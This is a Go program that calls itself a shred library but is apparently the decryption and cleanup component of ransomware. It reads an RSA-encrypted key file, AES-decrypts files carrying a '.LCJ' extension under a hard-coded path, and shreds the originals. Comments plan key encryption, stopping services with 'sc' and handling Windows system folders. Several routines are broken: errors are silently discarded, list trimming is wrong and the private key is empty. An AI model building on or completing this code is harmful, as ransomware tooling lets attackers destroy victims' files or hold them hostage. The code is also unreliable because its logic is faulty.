// Package shred is a golang library to mimic the functionality of the linux shred command
package main

// lisandro : delete all prints
// lisandro : sc delete|stop <service> (in cmd, delete|stop the service)

// lisandro : change the encryption swipe time from 3 to 2 ? (1?)

// encrypt the key file with RSA public key after creating the key file
// change the key var by another random string at the end of the program
import (
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func init() {
	//rand.Seed not working
	//rand.Seed(time.Now().UnixNano())
}

// ========= GENERAL =========
func Error(err error) (error){
	if err != nil{
		return err
	}
	return nil
}
// ========= END GENERAL =========
// ========= SHRED =========

// Conf is a object containing all choices of the user
type Conf struct {
	Times  int
	Zeros  bool
	Remove bool
}


// Path shreds all files in the location of path
// recursively. If remove is set to true files will be deleted
// after shredding. When a file is shredded its content
// is NOT recoverable so USE WITH CAUTION!!!

func (conf Conf) Path(path string) error {
	stats, err := os.Stat(path)
	Error(err)

	if stats.IsDir() {
		return conf.Dir(path)
	}

	return conf.File(path)
}

// Dir overwrites every File in the location of path and everything in its subdirectories
func (conf Conf) Dir(path string) error {
	var chErrors []chan error

	walkFn := func(path string, info os.FileInfo, err error) error {
		Error(err)

		if info.IsDir() {
			return nil
		}

		chErr := make(chan error)
		chErrors = append(chErrors, chErr)
		go func() {
			err := conf.File(path)
			chErr <- err
		}()

		return nil
	}

	if err := filepath.Walk(path, walkFn); err != nil {
		return err
	}

	for _, chErr := range chErrors {
		if err := <-chErr; err != nil {
			return err
		}
	}

	return nil
}

// File overwrites a given File in the location of path
func (conf Conf) File(path string) error {
	for i := 0; i < conf.Times; i++ {
		if err := overwriteFile(path, true); err != nil {
			return err
		}
	}

	if conf.Zeros {
		if err := overwriteFile(path, false); err != nil {
			return err
		}
	}

	if conf.Remove {
		var err = os.Remove(path)
		if err!=nil { return err }
	}

	return nil
}

func overwriteFile(path string, random bool) error {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}

	defer f.Close()

	info, err := f.Stat()
	Error(err)

	buff := make([]byte, info.Size())
	if random {
		if _, err := rand.Read(buff); err != nil {
			return err
		}
	}

	_, err = f.WriteAt(buff, 0)
	return err
}

// ========= END SHRED =========

// ========= ENCRYPT =========
var key []byte
/////////////////////

func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(privPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	return priv, nil
}

func import_private_key() *rsa.PrivateKey{
	//Create the keys
	//priv, pub := GenerateRsaKeyPair()
	// Export the keys to pem string
	var priv_pem string

	// Import the keys from pem string
	priv_parsed, _ := ParseRsaPrivateKeyFromPemStr(priv_pem)

	// Export the newly imported keys
	//priv_parsed_pem := ExportRsaPrivateKeyAsPemStr(priv_parsed)

	return priv_parsed
}

func decrypt_encryption_key() []byte {
	content, err := ioutil.ReadFile("key")

	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(string(content))

	private_key := import_private_key()
	decrypted_bytes, err := private_key.Decrypt(
		nil,
		content,
		&rsa.OAEPOptions{Hash: crypto.SHA256})

	if err != nil {
		panic(err)
	}
	return decrypted_bytes
}

func check_key() {
	_, err := ioutil.ReadFile("key") //Check to see if a key was already created
	if err != nil {
		pass() //If not, create one
	} else {
		key = decrypt_encryption_key() //If so, set key as the key found in the file
	}
}

/////////////////////

func decryptFile(inputfile string, outputfile string) {
	z, err := ioutil.ReadFile(inputfile)
	result := decrypt(key, z)
	err = ioutil.WriteFile(outputfile, result, 0755)
	if err != nil { //19111999 : we don't want this
		fmt.Printf("Unable to create decrypted file!\n")
		os.Exit(0)
	}
}

func decodeBase64(b []byte) []byte {
	data, err := base64.StdEncoding.DecodeString(string(b))
	if err != nil {
		fmt.Printf("Error: Bad Key!\n")
		os.Exit(0)
	}
	return data
}

func decrypt(key, text []byte) []byte {
	block, err := aes.NewCipher(key)
	Error(err)
	if len(text) < aes.BlockSize {
		fmt.Printf("Error!\n")
		os.Exit(0)
	}
	iv := text[:aes.BlockSize]
	text = text[aes.BlockSize:]
	cfb := cipher.NewCFBDecrypter(block, iv)
	cfb.XORKeyStream(text, text)
	return decodeBase64(text)
}

// ========= END ENCRYPT =========

func listdir(path string)([]string){
	searchDir := path
	fileList := make([]string, 0)
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		fileList = append(fileList, path)
		return err
	})

	if e != nil {
		panic(e)
	}
	return fileList;
}

func remove_to_index(s []string, index int) []string {
	return append(s[index:len(s)], s[len(s):]...)
}

func is_dir(path string)(bool){
	name := path
	fi, err := os.Stat(name)
	if err != nil {
		fmt.Println(err)
		return false
	}
	switch mode := fi.Mode(); {
	case mode.IsDir():
		return true
	case mode.IsRegular():
		return false
	}
	return false
}

func is_windows(file string)(){
	s := strings.Split(file, "/")
	if (s[len(s)-1] == "Windows"){
		fileList := listdir(file)
		for _, f := range fileList {
			s1 := strings.Split(f, "/")
			if (s1[len(s)-1] == "System32"){ // 19111999 :

			}
		}
	} else{
		return;
	}
	//fmt.Println(s[len(s)-1])
}

func pass()(){
	_ = ""
}

func tree(path string)(){
	file_list := listdir(path)

	shredconf := Conf{Times: 1, Zeros: false, Remove: true}
	start := time.Now()
	for _, file := range file_list {
		if is_dir(file){
			file_list = remove_to_index(file_list, 1)
			continue
		}
		if file[len(file)-4:] != ".LCJ"{
			continue
		}

		decryptFile(file, file[:len(file)-4])
		shredconf.Path(file)
		file_list = remove_to_index(file_list, 1)
	}
	elapsed := time.Since(start)
	log.Printf("SECOND ELAPSED : %s", elapsed)
}

func main() {
	check_key()
	path := "/root/y"
	tree(path)
	//tree(path, false)
}











